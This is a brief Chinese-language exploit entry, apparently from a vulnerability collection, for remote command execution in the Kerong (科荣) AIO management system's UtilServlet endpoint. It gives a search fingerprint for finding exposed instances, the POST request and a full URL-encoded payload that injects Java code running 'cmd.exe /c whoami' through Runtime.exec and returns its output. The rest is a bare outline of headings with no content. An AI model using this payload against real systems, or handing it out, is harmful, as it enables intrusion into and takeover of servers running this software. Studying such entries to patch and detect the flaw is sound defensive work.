# 科荣AIO管理系统UtilServlet存在远程命令执行漏洞

- **系统**：科荣AIO管理系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="科荣 AIO"`
- **请求**：`POST /UtilServlet HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
```

**其他**
- 科荣 AIO 管理系统 UtilServlet 存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 科荣 AIO 管理系统